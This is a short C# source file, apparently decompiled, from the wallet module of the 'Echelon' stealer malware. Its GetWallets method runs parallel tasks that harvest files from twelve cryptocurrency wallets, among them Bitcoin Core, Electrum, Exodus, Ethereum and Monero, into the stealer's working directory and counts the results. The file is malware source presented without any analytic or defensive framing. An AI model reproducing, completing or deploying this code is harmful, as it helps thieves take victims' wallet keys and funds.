using System;
using System.Threading.Tasks;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000013 RID: 19
	internal class Wallets
	{
		// Token: 0x0600004A RID: 74 RVA: 0x00019E90 File Offset: 0x00018090
		public static int GetWallets(string Echelon_Dir)
		{
			Task[] array = new Task[]
			{
				new Task(delegate()
				{
					Armory.ArmoryStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					AtomicWallet.AtomicStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					BitcoinCore.BCStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Bytecoin.BCNcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					DashCore.DSHcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Electrum.EleStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Ethereum.EcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					LitecoinCore.LitecStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Monero.XMRcoinStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Exodus.ExodusStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Jaxx.JaxxStr(Echelon_Dir);
				}),
				new Task(delegate()
				{
					Zcash.ZecwalletStr(Echelon_Dir);
				})
			};
			Task[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				array2[i].Start();
			}
			Task.WaitAll(array);
			return Wallets.count;
		}

		// Token: 0x0400004A RID: 74
		public static int count;
	}
}
